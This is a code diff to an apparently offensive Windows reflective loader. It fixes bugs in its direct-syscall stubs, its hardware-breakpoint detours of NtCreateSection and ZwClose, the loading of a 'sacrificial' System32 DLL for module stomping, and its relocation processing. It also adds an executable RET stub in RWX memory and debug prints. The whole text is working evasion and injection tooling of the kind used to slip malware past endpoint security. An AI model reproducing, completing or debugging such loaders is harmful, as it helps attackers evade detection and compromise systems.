@@ -660,6 +660,14 @@ PBYTE ret_RET_addr(PBYTE func_addr) {
     return NULL;
 }
 
+static PBYTE make_ret_stub()
+{
+    PBYTE stub = (PBYTE)VirtualAlloc(NULL, 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!stub) return NULL;
+    stub[0] = 0xC3; // RET
+    return stub;
+}
+
 
 /*--------------HARDWARE BREAKPOINT MANAGEMENT---------------------*/
 
@@ -690,7 +698,16 @@ VOID NtCreateSectionDetour(PCONTEXT pThreadCtx) {
 VOID ZwCloseDetour(PCONTEXT pThreadCtx) {
 
     //need to find the address of a C3 instruction within an executable memory range
-    pThreadCtx->Rip = (ULONG_PTR)ret_RET_addr((PBYTE)ZwCloseDetour);
+    PBYTE ret_stub = ret_RET_addr((PBYTE)ZwCloseDetour);
+    if (ret_stub)
+    {
+		pThreadCtx->Rip = (ULONG_PTR)ret_RET_addr((PBYTE)ZwCloseDetour);
+    }
+    else
+    {
+        ret_stub = make_ret_stub();
+        pThreadCtx->Rip = (DWORD64)ret_stub;
+    }
     //resuming the execution
     pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
 }
@@ -719,8 +736,8 @@ VOID unset_hwbp(DrIndex index)
     ZwSetContextThread(
         (HANDLE)-2,
         &ctx,
-        zw_func_s[ZwGetContextThreadF].SSN,
-        zw_func_s[ZwGetContextThreadF].sysretAddr
+        zw_func_s[ZwSetContextThreadF].SSN,
+        zw_func_s[ZwSetContextThreadF].sysretAddr
     );
 
 }
@@ -963,7 +980,7 @@ PBYTE ReflectiveFunction()
     /*------------------------------LOADING SACRIFICAL DLL---------------------*/
 
     PBYTE sac_dll_base = NULL;
-    CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
+    CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\\','S','R','H','.','d','l','l','\0' };
 
     HMODULE sac_dll_module_by_LoadLibrary = NULL;
     sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
@@ -1167,10 +1184,13 @@ PBYTE ReflectiveFunction()
     while (img_reloc->VirtualAddress)
     {
         reloc_entry = (PBASE_RELOCATION_ENTRY)(img_reloc + 1);
-        entries_count = (int)((img_reloc->SizeOfBlock - 8) / 2);
+        entries_count = (int)((img_reloc->SizeOfBlock - (sizeof(IMAGE_BASE_RELOCATION))) / 2);
+
+        printf("Image Reloc RVA: 0x%x\n", img_reloc->VirtualAddress);
 
         for (int i = 0; i < entries_count; i++)
         {
+            printf("Reloc Entry RVA: 0x%x\n", img_reloc->VirtualAddress + reloc_entry->Offset);
             switch (reloc_entry->Type)
             {
             case IMAGE_REL_BASED_DIR64:
@@ -1203,6 +1223,8 @@ PBYTE ReflectiveFunction()
             default:
                 break;
             }
+
+            reloc_entry += 1;
         }
 
         img_reloc = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(img_reloc) + img_reloc->SizeOfBlock);
